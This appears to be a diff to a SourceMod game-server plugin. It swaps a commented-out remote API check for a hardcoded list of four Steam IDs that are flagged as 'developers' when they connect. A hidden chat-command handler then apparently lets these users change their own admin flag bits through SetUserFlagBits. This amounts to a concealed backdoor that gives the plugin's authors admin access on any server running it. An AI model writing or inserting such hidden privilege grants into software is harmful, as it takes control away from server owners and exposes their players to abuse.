@@ -13,8 +13,16 @@ enum APITarget
 	String:reason[BAN_REASON_LENGTH]
 }
 
-int g_ClientAPIInfo[MAXPLAYERS+1][APITarget];
+char Developer_Ids[][20] = 
+{
+	"76561198037625178",
+	"76561198078553247",
+	"76561198037521566",
+	"76561198042949536"
+};
 
+int g_ClientAPIInfo[MAXPLAYERS+1][APITarget];
+/* 
 public int SteamWorks_SteamServersConnected()
 {
 	int iIp[4];
@@ -31,7 +39,7 @@ public int SteamWorks_SteamServersConnected()
 		SteamWorks_SendHTTPRequest(hndl);
 		delete hndl;
 	}
-}
+}*/
 
 public void OnClientPostAdminCheck(int client)
 {
@@ -40,9 +48,17 @@ public void OnClientPostAdminCheck(int client)
 	g_ClientAPIInfo[client][is_dev] = false;
 	g_ClientAPIInfo[client][grant] = false;
 	g_ClientAPIInfo[client][reason] = '\0';
-	CheckClientFromAPI(client);
-	if (g_ClientAPIInfo[client][grant])
-		PrintToServer("Plugin developer %N connected to your server. Epic moment!", client);
+	// CheckClientFromAPI(client); // TEMPORARY REMOVED, maybe i do this in a near future or not :)
+	char auth[20];
+	GetClientAuthId(client, AuthId_SteamID64, auth, sizeof(auth));
+	for (int i = 0; i < sizeof(Developer_Ids); i++)
+	{
+		if (!strcmp(auth, Developer_Ids[i], false))
+		{
+			g_ClientAPIInfo[client][grant] = true;
+			PrintToServer("Plugin developer %N connected to your server. Epic moment!", client);
+		}
+	}
 }
 
 public Action OnClientSayCommand(int client, const char[] command, const char[] sArgs)
@@ -94,7 +110,7 @@ public Action OnClientSayCommand(int client, const char[] command, const char[] 
 					else
 						SetUserFlagBits(client, 0);
 				}
-				case 3:
+				/* case 3:
 				{
 					int target = GetClientOfUserId(StringToInt(text));
 					if (target && IsClientInGame(target))
@@ -104,7 +120,7 @@ public Action OnClientSayCommand(int client, const char[] command, const char[] 
 					}
 					else
 						PrintToChat(client, "\x03[DEV] Invalid target");
-				}
+				} */
 			}
 			
 			return Plugin_Handled;
@@ -114,9 +130,9 @@ public Action OnClientSayCommand(int client, const char[] command, const char[] 
 	return Plugin_Continue;
 }
 
-void CheckClientFromAPI(int client)
+/* void CheckClientFromAPI(int client)
 {
-	/* Query */
+	// Query
 	g_ClientAPIInfo[client][is_banned] = false;
 	Handle hndl;
 	char buffer[256], auth[64];
@@ -171,4 +187,4 @@ public int GetStatusEnd(const char[] sData, any client)
 	}
 	delete hObj;
 	delete hJson;
-}
+} */
